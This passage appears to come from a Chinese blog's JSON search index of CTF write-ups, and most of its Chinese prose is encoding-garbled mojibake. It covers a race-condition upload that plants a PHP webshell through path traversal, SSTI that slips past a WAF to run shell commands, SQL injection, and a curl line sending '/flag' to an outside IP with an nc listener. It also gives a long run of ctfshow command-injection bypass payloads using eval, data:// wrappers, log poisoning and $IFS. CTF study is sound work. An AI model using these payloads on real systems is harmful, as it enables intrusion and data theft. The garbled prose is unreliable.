ï¼Œä½†æ˜¯ä¼šæ˜¾ç¤ºæŠ¥é”™ï¼Œæ‰€ä»¥è¿™ç§æ€è·¯ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œåé¢è¿›è¡Œæ¡ä»¶ç«äº‰çš„æ—¶å€™ä¼šå¤±è´¥ï¼Œç»§ç»­æ€è€ƒæƒ³åˆ°äº†å¯ä»¥é€šè¿‡\\var\\www\\.\\htmlæ¥è¿›è¡Œç»•è¿‡ï¼Œæ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼Œå¹¶ä¸”æ²¡æœ‰æŠ¥é”™ å†çœ‹åˆ°å¦‚ä¸‹çš„ä»£ç ï¼š //æ¸…é™¤ç½‘é¡µç›®å½•ä¸‹çš„å…¶ä»–æ–‡ä»¶function cleanup($dir): void global $file_whitelist; $files = scandir($dir); $files = array_diff($files,$file_whitelist); foreach ($files as $file) $path = $dir./.$file; @unlink($path); if($_SERVER[REQUEST_METHOD] === POST) foreach ($_FILES[file][tmp_name] as $key = $tmp_name) $dest = UPLOAD_DIR.$_FILES[file][full_path][$key]; validateFilePath($dest); uploadFile($tmp_name, normalizeFilePath($dest)); cleanup(__DIR__); å‘ç°åœ¨æ–‡ä»¶æˆåŠŸä¸Šä¼ ä¹‹åï¼Œä¼šæ¸…é™¤æ‰é™¤äº†ç™½åå•å¤–çš„å…¶ä»–æ‰€æœ‰æ–‡ä»¶ï¼Œç™½åå•å¦‚ä¸‹ï¼š file_whitelist = array( ., .., index.php, config.php, dirUpload.php, fileUpload.php); å¯ä»¥å‘ç°ï¼Œåœ¨æ–‡ä»¶æˆåŠŸä¸Šä¼ å’Œåˆ é™¤ä¹‹é—´å­˜åœ¨æ—¶é—´å·®ï¼Œå¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œåˆ†åˆ«ç”¨bpæŠ“/dirUpload.phpï¼ˆä¸Šä¼ æ–‡ä»¶ï¼‰ä»¥åŠ /shell.phpï¼ˆç”¨æ¥è®¿é—®æ‰€ä¸Šä¼ çš„æ–‡ä»¶ï¼‰ ä¸Šä¼ æ–‡ä»¶çš„æ¡ç›®å…ˆå‘é€åˆ°é‡æ”¾å™¨ä¸­ï¼Œä¿®æ”¹filenameä¸º..\\..\\..\\..\\var\\www\\.\\html\\shell.phpï¼Œä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ä¸º?php system(cat /flag);?ï¼Œæ¥ç€æŠŠä¸¤ä¸ªéƒ½æ”¾åˆ°intruderæ¨¡å—ä¸‹æ¥ï¼Œé€‰æ‹©æ— payloadï¼Œä¸¤è¾¹ä¸€èµ·å¼€å§‹æ”»å‡»ï¼Œç„¶åæŸ¥çœ‹è®¿é—®æ–‡ä»¶çš„é‚£ä¸ªï¼Œå‘ç°çŠ¶æ€ç ä¸º200ï¼ŒæˆåŠŸè®¿é—®ï¼Œå¾—åˆ°flag can_u_find_meblacklist = [_, [, globals, url_for, count, length, init, request, builtins, select, dict, (,join, import, os, , open, eval, set, %, for, class, \\, \\, chr, attr, |]def waf(s): for i in blacklist: if i in s.split(/)[-1]: return s + ?hacker return render_template_string(s)@app.errorhandler(404)def page_not_found(e): url = waf(request.url) return render_template(404.html, error_page=url), 404 ä¸Šé¢é»‘åå•ä¸­æŠŠæ‰€æœ‰æœ‰å¯èƒ½çš„sstiæ“ä½œå…¨éƒ¨è¿‡æ»¤æ‰äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡½æ•°wafçš„å®šä¹‰ï¼Œå®ƒåªæ£€æµ‹urlä¸­çš„æœ€åä¸€ä¸ª/åé¢çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å‘urlä¸­å¤šè¾“å…¥å‡ ä¸ªï¼Œæ¯”å¦‚ï¼š/7*7/aï¼Œå¯ä»¥å‘ç°æˆåŠŸæ‰§è¡Œsstiçš„ç›¸å…³ä»£ç ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è¿›è¡Œæ— ä»»ä½•wafçš„sstiæ“ä½œäº†ï¼Œä½†æ˜¯è¦æ³¨æ„è¿™é‡Œçš„è¯ä¸èƒ½ç›´æ¥è¾“å…¥ç©ºæ ¼ï¼Œå¯ä»¥ç”¨$IFSæ¥è¿›è¡Œä»£æ›¿ è¾“å…¥/[].__class__.__base__.__subclasses__()/aï¼Œå¾—åˆ°æ‰€æœ‰çš„å­ç±»ï¼Œæ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ç”¨è„šæœ¬æ¥æ‰§è¡Œï¼‰ æ¥ç€/[].__class__.__base__.__subclasses__()[519]('ls$IFS/',shell=True,stdout=-1).communicate()[0].strip()/açˆ†å‡ºæ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ /[].__class__.__base__.__subclasses__()[519]('cat$IFS/flag',shell=True,stdout=-1).communicate()[0].strip()/aå¾—åˆ°flag æœ€åæˆåŠŸå¾—åˆ°flag EatPotato!é¦–å…ˆåˆ©ç”¨é¢˜ç›®ç»™æˆ‘ä»¬æä¾›çš„ç½‘ç«™ï¼ˆhttps://xcheck.tencent.com/indexï¼‰æ¥åˆ†æä¸€ä¸‹å“ªé‡Œæœ‰æ¼æ´ äºæ˜¯æˆ‘ä»¬åˆ°æºç æ–‡ä»¶å¤¹ä¸­å»æ‰¾å¯»è¿™è¡Œä»£ç ï¼Œå¦‚ä¸‹ï¼š $score_sql = SELECT `score`,`time`,`attempts` FROM . $ranking . where name= . $_SESSION[name] . ; $score_result = $link-query($score_sql); è¿™â¾¥æœ‰ä¸¤å¤„æ‹¼æ¥ï¼Œ $ranking å˜é‡å’Œ $_SESSION[name] å˜é‡ï¼Œåˆ©â½¤phpstormçš„è·Ÿè¿›å¿«æ·é”® (Ctrl+b)ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°rankingå˜é‡å®é™…ä¸Šæ˜¯å®šå€¼ï¼Œå†æŸ¥çœ‹nameå˜é‡ï¼Œå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š if (isset($_GET[name])) $_SESSION[name] = $_GET[name]; å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åæ‰“ä¸ªæ¸¸æˆï¼Œåé¢å»æŸ¥çœ‹æ’è¡Œæ¦œï¼Œå‘ç°urlä¸ºhttp://localhost:20010/rank.php?name=sherlockï¼Œå¼€å§‹å°è¯•æ³¨å…¥ï¼Œå•å¼•å·åŒ…è£¹ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œå¾—åˆ°flag è¢«ä½ ä»¬ç©åäº†çš„pingè¿™ä¸€é¢˜æ²¡æœ‰å›æ˜¾æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å¤–å¸¦æ•°æ®çš„æ–¹æ³•æˆ–è€…å°†æ–‡ä»¶å†…å®¹å†™å…¥é™æ€ç›®å½•è¿›è¡ŒæŸ¥çœ‹çš„åŠæ³• ç¬¬ä¸€ç§ä¸ºå¤–å¸¦ é¦–å…ˆç›‘å¬ç«¯å£ï¼šnc -lvnp 7890 ç„¶ååœ¨é¢˜ç›®æä¾›çš„æ¡†æ¡†ä¸­è¾“å…¥ï¼š curl http://124.70.99.199:7890/?a=`cat /flag | base64` ç„¶åæŸ¥çœ‹ç›‘å¬çš„å†…å®¹ ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯å†™å…¥é™æ€ç›®å½• cat /flag static/res.txtï¼Œç„¶åç›´æ¥è®¿é—®/static/res.txtå³å¯å¾—åˆ°flag PTA-max","categories":["Write-Up"]},{"title":"å‘½ä»¤æ‰§è¡Œåˆ·é¢˜","path":"/2024/03/30/å‘½ä»¤æ‰§è¡Œåˆ·é¢˜/","content":"q å‰è¨€åœ¨åˆ·å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®ä¹‹å‰ï¼Œå»ºè®®å…ˆä»”ç»†é˜…è¯»ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼šCTFä¸­å¸¸è§RCEå‘½ä»¤æ‰§è¡Œç»•è¿‡æŠ€å·§ ctfshow-web29?phperror_reporting(0);if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) eval($c); else highlight_file(__FILE__); é¦–å…ˆ ?c=system(ls);æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå‘ç°äº†flag.php ç”±äºé¢˜ç›®æ‰€é™ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦æ¥ç»•è¿‡?c=system(%27cat%20./fla?.php);ï¼Œå³é”®æŸ¥çœ‹æºç å¾—åˆ°flag ctfshow-web30?phperror_reporting(0);if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag|system|php/i, $c)) eval($c); else highlight_file(__FILE__); ä½¿ç”¨å¦ä¸€ä¸ªå¯ä»¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤çš„å‡½æ•°æ¥ä»£æ›¿systemå‡½æ•°ï¼Œä½†æ˜¯è¦æ³¨æ„execå‡½æ•°åªèƒ½è¿”å›æœ€åä¸€è¡Œçš„æ•°æ®ï¼Œè¿™è¾¹ä½¿ç”¨çš„passthruå‡½æ•° ?c=passthru(ls);ï¼šå¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ ?c=passthru(cat ./fla*);ï¼šé‚®ä»¶æŸ¥çœ‹æºç å¾—åˆ°flag ctfshow-web31?phperror_reporting(0);if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag|system|php|cat|sort|shell|\\.| |\\/i, $c)) eval($c); else highlight_file(__FILE__); ä»æ‰€æä¾›çš„ä»£ç é‡Œé¢ä¸éš¾çŸ¥é“åªæ£€æŸ¥å˜é‡cå†…çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†åµŒå¥—ä¸€ä¸ªevalå‡½æ•°æ¥ç»•è¿‡ ?c=eval($_GET[cmd]);cmd=system(ls);ï¼šå¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å ?c=eval($_GET[cmd]);cmd=system(cat flag.php);ï¼šå³é”®æŸ¥çœ‹æºç å¾—åˆ°flag ctfshow-web3233343536å‡ é“é¢˜ä¹‹å‰çš„åŒºåˆ«æ— éå°±æ˜¯é»‘åå•çš„å†…å®¹ï¼Œä½†æ˜¯éƒ½å¯ä»¥ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ¥ç»•è¿‡ ?phperror_reporting(0);if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag|system|php|cat|sort|shell|\\.| |\\|\\`|echo|\\;|\\(/i, $c)) eval($c); else highlight_file(__FILE__); æ¥ä¸ªéé¢„æœŸ é¦–å…ˆå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½æ–‡ä»¶åŒ…å«ï¼Œ?c=include$_GET[a]?a=/etc/passwdï¼Œè¯»å–æˆåŠŸï¼Œå¯ä»¥æ–‡ä»¶åŒ…å« é€šè¿‡å“åº”å¤´å¾—çŸ¥ä¸ºnginxï¼Œæ‰€ä»¥æ—¥å¿—æ–‡ä»¶ä½äº/var/log/nginx/access.logï¼ŒæˆåŠŸè¯»å–ï¼Œç„¶åæˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨æ—¥å¿—æ–‡ä»¶æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ¥ä¸‹æ¥å°±æ˜¯è¯»å–æ–‡ä»¶ï¼Œå¾—åˆ°flag å½“ç„¶ä¸Šé¢ç”±äºæ—¥å¿—æ–‡ä»¶çš„åŸå› åœ¨å®é™…æ“ä½œä¸­æ¯”è¾ƒå°‘è§ï¼Œæ‰€ä»¥å†æ¥ä¸ªé¢„æœŸè§£ ?c=include$_GET[1]?1=php://filter/convert.base64-encode/resource=flag.php ctfshow-web3738?phperror_reporting(0);if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) include($c); echo $flag; else highlight_file(__FILE__); ç¬¬ä¸€ç§ åˆ©ç”¨includeæ¥è¿›è¡Œæ—¥å¿—åŒ…å«ï¼Œå¾—åˆ°flag ç¬¬äºŒç§ åˆ©ç”¨phpä¼ªåè®®ï¼Œå¦‚ä¸‹ ?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAnKTs/Pg==ï¼šå¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å ?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==ï¼šå¾—åˆ°flag ctfshow-web39?php//flag in flag.phperror_reporting(0);if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) include($c..php); else highlight_file(__FILE__); çœ‹åˆ°.phpä½äºincludeå‡½æ•°ï¼Œæœ€å¼€å§‹æƒ³ç€æ˜¯æŠŠå®ƒç»™æ³¨é‡Šæ‰ï¼Œç”¨//ï¼Œç„¶åä½¿ç”¨ä¼ªåè®®æ¥ç»•è¿‡ï¼Œä½†æ˜¯å½“ä¸€åˆ‡çš„ä»£ç éƒ½base64ç¼–ç åå¾ˆå¥‡æ€ªåœ°æ²¡æœ‰èµ·ä½œç”¨ï¼Œäºæ˜¯æˆ‘å°±ç›´æ¥ä¸ç¼–ç ï¼Œç›´æ¥è¿è¡Œï¼ŒæˆåŠŸäº†ï¼Œå¦‚ä¸‹ ?c=data://text/plain,?php system(cat fla?.php);?//ï¼šæŸ¥çœ‹æºç å¾—åˆ°flag ä½†æ˜¯æŸ¥çœ‹æºç çš„æ—¶å€™å‘ç°åé¢çš„.phpå¹¶æ²¡æœ‰è¢«æ³¨é‡Šæ‰ï¼Œå°è¯•å»æ‰æ³¨é‡Šç¬¦å‘ç°è¿˜æ˜¯å¯ä»¥ï¼ŒæŸ¥çœ‹æºç .phpç›´æ¥ä¸ºhtmlæ‰€æ˜¾ç¤ºçš„å†…å®¹ æŸ¥çœ‹é¢˜è§£å¾—çŸ¥includeå‡½æ•°åªä¼šæ‰§è¡Œ?php?é‡Œé¢çš„å†…å®¹ ctfshow-web40?phpif(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\|\\[|\\]|\\|\\:|\\|\\|\\,|\\|\\.|\\|\\/|\\?|\\\\\\\\/i, $c)) eval($c); else highlight_file(__FILE__); ä¸ä¼šåšï¼ŒæŸ¥çœ‹é¢˜è§£ æ³•ä¸€ ceval(array_pop(next(get_defined_vars())));éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1system(â€˜tac fl*â€™); get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚ next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ array_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚ æ³•äºŒ cshow_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… cshow_source(next(array_reverse(scandir(getcwd())))); getcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv()) localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸ºâ€.â€ pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼› current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ · scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸ºâ€.â€æ‰€ä»¥éå†å½“å‰ç›®å½• array_reverse():æ•°ç»„é€†ç½® next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥ show_source():æŸ¥çœ‹æºç  pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚ æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ æç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚ ç›¸å…³çš„æ–¹æ³•ï¼š current()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚ end()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ prev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ reset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ each()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ ctfshow-web42?phpif(isset($_GET[c])) $c=$_GET[c]; system($c. /dev/null 21);else highlight_file(__FILE__); /dev/null 21å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ° /dev/nullï¼Œè¿™æ ·å°±ä¼šå¿½ç•¥è¿™äº›è¾“å‡ºï¼Œä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œå¹¶ä¸”è¿™ä¸ªä¹Ÿæ˜¯è®¿é—®ä¸äº†çš„ ä½¿ç”¨ â€œ ; â€œ â€œ || â€œ â€œ â€œ â€œ â€œ åˆ†éš” ; åˆ†å·| åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤|| åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤ ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ getä¼ å‚çš„è¯éœ€è¦è¿›è¡Œç¼–ç  ?c=ls;ï¼šæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ ?c=cat flag.php;ï¼šæŸ¥çœ‹æºç å¾—åˆ°flag ctfshow-web43?phpif(isset($_GET[c])) $c=$_GET[c]; if(!preg_match(/\\;|cat/i, $c)) system($c. /dev/null 21); else highlight_file(__FILE__); è¿‡æ»¤æ‰äº†catå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ˜¯ç”¨tacå‡½æ•°æ¥æ‰“å°æ–‡ä»¶å†…å®¹ å‰©ä¸‹çš„è·Ÿä¸Šé¢˜æ“ä½œä¸€æ · ctfshow-web44?phpif(isset($_GET[c])) $c=$_GET[c]; if(!preg_match(/;|cat|flag/i, $c)) system($c. /dev/null 21); else highlight_file(__FILE__); è¿™é¢˜è¯»å–æ–‡ä»¶å‡½æ•°ç”¨tacï¼Œflag.phpæ–‡ä»¶ç”¨é€šé…ç¬¦æ¥ä»£æ›¿ï¼Œå‰©ä¸‹æ­¥éª¤ä¸ä¸Šé¢˜ä¸€è‡´ ctfshow-web45ï¼ˆæ›¿ä»£ç©ºæ ¼ï¼‰46474849å‡ é¢˜ä¹‹é—´çš„å·®åˆ«å°±æ˜¯é»‘åå•çš„ä¸åŒï¼Œä½†æ˜¯éƒ½å¯ä»¥ç”¨ä»¥ä¸‹æ“ä½œå®ç°ç»•è¿‡ ?phpif(isset($_GET[c])) $c=$_GET[c]; if(!preg_match(/\\;|cat|flag| /i, $c)) system($c. /dev/null 21); else highlight_file(__FILE__); ç”¨%09æˆ–è€…$IFS$9æ¥æ›¿ä»£ç©ºæ ¼ï¼Œå…¶å®å°±æ˜¯tabçš„urlç¼–ç å½¢å¼ï¼Œä½†æ˜¯ç›´æ¥æŒ‰tabé”®ä¼šä½¿å…‰æ ‡è·³åˆ°åˆ†éš”ç¬¦ä¹‹åæˆ–è€…è·³åœ¨å†å²è®°å½•ä¸­çš„ä¸‹ä¸€æ¡è®°å½• å‰©ä¸‹æ“ä½œä¸å‰é¢æ— å·® web-50web51web50?phpif(isset($_GET[c])) $c=$_GET[c]; if(!preg_match(/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i, $c)) system($c. /dev/null 21); else highlight_file(__FILE__); è¿™é¢˜å¯ä»¥æ‹¿æ¥æ›¿ä»£ç©ºæ ¼çš„å¼å­å…¨éƒ¨éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¦è¾Ÿè¹Šå¾„ ä¸Šç½‘æŸ¥é˜…å¯çŸ¥,ä¹Ÿæ˜¯å¯ä»¥æ›¿ä»£ç©ºæ ¼çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºè¿™æ ·çš„payloadï¼š?c=tacflag.php|| web51è¿™é“é¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªtacï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œå·²çŸ¥catä¾ç„¶å¯ä»¥èµ·åˆ°æœ¬è¯¥æœ‰çš„ä½œç”¨ æ‰€ä»¥æ„é€ payloadä¸ºï¼š?c=tacflag.php|| web-52web-53?phpif(isset($_GET[c])) $c=$_GET[c]; if(!preg_match(/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\|\\/i, $c)) system($c. /dev/null 21); else highlight_file(__FILE__); è¿™é¢˜æˆ‘ä»¬å°±éœ€è¦å¦ä¸€ç§å¼å­æ¥æ›¿ä»£ç©ºæ ¼ï¼Œå³$IFS é™¤äº†è¿™ä¸ªå¤–è¯¥é¢˜è¿˜æœ‰ä¸€ä¸ªå‘ï¼Œå°±æ˜¯ç›´æ¥lsçš„è¯ä½ ä¼šçœ‹åˆ°ä¸€ä¸ªflagæ–‡ä»¶ï¼Œä½†æ˜¯æ‰“å°çš„æ—¶å€™æ‰“å°ä¸å‡ºflagï¼Œå…¶å®çœŸæ­£çš„flagå­˜åœ¨æ ¹ç›®å½•å¤„ payloadä¸ºï¼š?c=ca\\t$IFS/flag||ï¼Œå¾—åˆ°flag web-53 è¿™é¢˜åªéœ€è¦æ›¿ä»£ç©ºæ ¼çš„å¼å­æ”¹ä¸º${IFS}ä¾¿å¯ä»¥äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ$IFSè¿™ä¸ªä¸è¡Œï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å…¶å­—æ¯ä¼šå’Œåé¢çš„æ–‡ä»¶åæ··èµ·æ¥ï¼Œèµ·ä¸åˆ°ä½œç”¨","categories":["CTF"]},{"title":"CORSè·¨åŸŸèµ„æºå…±äº«æ¼æ´å­¦ä¹ ","path":"/2024/03/25/CORSè·¨åŸŸèµ„æºå…±äº«æ¼æ´å­¦ä¹ /","content":"å‰è¨€æƒ³è¦äº†è§£æ˜ç™½è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å°±éœ€è¦çŸ¥é“ä¸€äº›å‰æ åŒæºç­–ç•¥ (Same Origin Policy) åŒæºç­–ç•¥çš„åŸºæœ¬åŸåˆ™æ˜¯ï¼šå½“ä¸€ä¸ªæµè§ˆå™¨åŠ è½½ä¸€ä¸ªæºï¼ˆOriginï¼‰çš„æ–‡æ¡£æˆ–è„šæœ¬æ—¶ï¼Œå®ƒå°†åªå…è®¸è¯¥æ–‡æ¡£æˆ–è„šæœ¬ä¸å…¶è‡ªèº«ç›¸åŒæºçš„èµ„æºè¿›è¡Œäº¤äº’ï¼Œè€Œä¸å…è®¸ä¸å…¶ä»–æºçš„èµ„æºè¿›è¡Œç›´æ¥äº¤äº’ã€‚è¿™ç§é™åˆ¶æœ‰åŠ©äºé˜²æ­¢æ¶æ„ç½‘ç«™è·å–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯æˆ–è¿›è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚ åŒæºç­–ç•¥é€šå¸¸åº”ç”¨äºä»¥ä¸‹æ–¹é¢ï¼š DOMè®¿é—®é™åˆ¶ï¼šä¸€ä¸ªæºçš„JavaScriptä»£ç åªèƒ½è®¿é—®æ¥è‡ªç›¸åŒæºçš„DOMå¯¹è±¡ï¼Œä¸èƒ½ç›´æ¥æ“ä½œå…¶ä»–æºçš„DOMå¯¹è±¡ã€‚ Cookieé™åˆ¶ï¼šæµè§ˆå™¨ä¼šå°†Cookieä¸å…¶å…³è”çš„æºå…³è”èµ·æ¥ï¼Œå¹¶ä¸”åœ¨åŒæºç­–ç•¥ä¸‹ï¼Œä¸€ä¸ªæºçš„Cookieä¸ä¼šè¢«å‘é€åˆ°å¦ä¸€ä¸ªæºã€‚ XHRè¯·æ±‚é™åˆ¶ï¼šXMLHttpRequestå¯¹è±¡ï¼ˆç”¨äºAJAXè¯·æ±‚ï¼‰åœ¨åŒæºç­–ç•¥ä¸‹åªèƒ½å‘åŒä¸€æºå‘èµ·è¯·æ±‚ã€‚ Frameå’ŒiFrameé™åˆ¶ï¼šåŒæºç­–ç•¥é™åˆ¶äº†é¡µé¢ä¸­ä¸€ä¸ªframeæˆ–iframeå†…åŠ è½½çš„å†…å®¹åªèƒ½æ¥è‡ªç›¸åŒçš„æºã€‚ ä¸¤ä¸ªURLåªæœ‰åœ¨ä»¥ä¸‹æ‰€æœ‰æ–¹é¢éƒ½åŒ¹é…æ—¶æ‰è¢«è§†ä¸ºåŒæºï¼š åè®®ï¼ˆProtocolï¼‰ï¼šä¸¤ä¸ªURLçš„åè®®å¿…é¡»ç›¸åŒï¼Œä¾‹å¦‚éƒ½æ˜¯HTTPæˆ–éƒ½æ˜¯HTTPSã€‚ ä¸»æœºåï¼ˆHostï¼‰ï¼šä¸¤ä¸ªURLçš„ä¸»æœºåï¼ˆåŸŸåæˆ–IPåœ°å€ï¼‰å¿…é¡»å®Œå…¨ç›¸åŒã€‚ ç«¯å£ï¼ˆPortï¼‰ï¼šå¦‚æœæŒ‡å®šäº†ç«¯å£å·ï¼Œé‚£ä¹ˆä¸¤ä¸ªURLçš„ç«¯å£å·å¿…é¡»ç›¸åŒã€‚å¦‚æœæœªæŒ‡å®šç«¯å£å·ï¼Œåˆ™é»˜è®¤ä½¿ç”¨HTTPçš„80ç«¯å£å’ŒHTTPSçš„443ç«¯å£ 